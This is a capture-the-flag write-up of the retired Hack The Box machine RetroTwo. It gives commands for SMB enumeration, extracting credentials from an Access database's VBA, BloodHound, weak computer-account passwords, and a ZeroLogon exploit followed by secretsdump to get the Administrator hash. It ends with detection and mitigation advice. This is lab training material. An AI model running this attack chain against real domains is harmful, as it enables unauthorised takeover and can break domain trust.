---
machine: RetroTwo
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, access-database, pre-windows-2000, zerologon]
---

# RetroTwo — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real credentials or flags.

## Summary

An old DC (Server 2008 R2) with an SMB share containing an Access database. A VBA module stores domain credentials; they enable BloodHound enumeration and abuse of weak `Pre-Windows 2000` computer-account passwords. RDP access to an old host allows ZeroLogon (CVE-2020-1472) and retrieval of Administrator's hash.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
netexec smb <IP> --shares
netexec smb <IP> -u '' -p '' --shares
```

The share exposes an `.mdb`/`.accdb`. Copy it and inspect it in an isolated environment:

```bash
mdb-tables access.mdb
mdb-export access.mdb <TABLE> > table.csv
```

Also review VBA modules with `olevba` or by opening the database in Access. The module contains a domain username and password; they are not published.

## Initial access

```bash
netexec smb <IP> -u <USER> -p '<PASSWORD>' --shares
bloodhound-python -u <USER> -p '<PASSWORD>' -d retro2.vl -ns <IP> -c All
```

BloodHound shows computer accounts with predictable passwords and Pre-Windows 2000 compatibility. Try the computer name as the password:

```bash
netexec smb <IP> -u 'FS01$' -p '<PASSWORD>' --shares
```

The computer account mounts the share and provides RDP access to an old server:

```bash
xfreerdp /u:'FS01$' /p:'<PASSWORD>' /v:<IP>
```

## Escalation

The host is Server 2008 R2 without the ZeroLogon patch. Reset the computer account password to empty and dump Administrator's hash:

```bash
python3 zerologon.py <DC_NAME> <IP>
impacket-secretsdump -just-dc -hashes :<NTLM_HASH> administrator@<IP>
```

The hash allows `psexec`/`wmiexec` as Administrator. ZeroLogon is destructive: in a real environment, restore the original password after testing.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lessons

- Access databases may contain macros with credentials.
- Computer accounts with passwords equal to their names are a classic flaw.
- `Pre-Windows 2000 Compatible Access` expands the attack surface.
- ZeroLogon needs an unpatched DC and can break domain trust.

## Detection and mitigation

- Apply the CVE-2020-1472 patch and enable enforcement.
- Audit computer accounts with weak or old passwords.
- Restrict `Pre-Windows 2000 Compatible Access` and review its members.
- Alert on computer password changes (4742) and anomalous Netlogon authentications.

## References

- <https://0xdf.gitlab.io/2025/07/22/htb-retrotwo.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2020-1472>
- <https://attack.mitre.org/techniques/T1068/>
